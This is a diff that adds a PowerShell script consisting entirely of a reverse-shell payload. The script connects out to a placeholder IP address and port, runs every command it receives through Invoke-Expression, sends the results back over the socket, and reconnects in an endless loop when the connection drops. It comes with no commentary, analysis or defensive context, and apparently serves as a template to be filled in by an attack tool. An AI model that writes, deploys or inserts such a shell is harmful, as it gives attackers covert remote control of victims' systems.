@@ -1,0 +1,27 @@
+while ($true) {
+    try {
+        $TCPClient = New-Object Net.Sockets.TCPClient("__IPADDR__", __PORT__)
+        $NetworkStream = $TCPClient.GetStream()
+        $StreamReader = New-Object IO.StreamReader($NetworkStream)
+        $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+        $StreamWriter.AutoFlush = $true
+        $Buffer = New-Object System.Byte[] 1024
+
+        while ($TCPClient.Connected) {
+            while ($NetworkStream.DataAvailable) {
+                $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
+                $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)
+                if ($Code.Length -gt 1) {
+                    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
+                    $StreamWriter.Write("$Output`n")
+                }
+            }
+        }
+
+        $TCPClient.Close()
+    } catch {
+        Write-Host "[-] Connection failed, retrying in 5 seconds..."
+        Start-Sleep -Seconds 5
+    }
+}
+
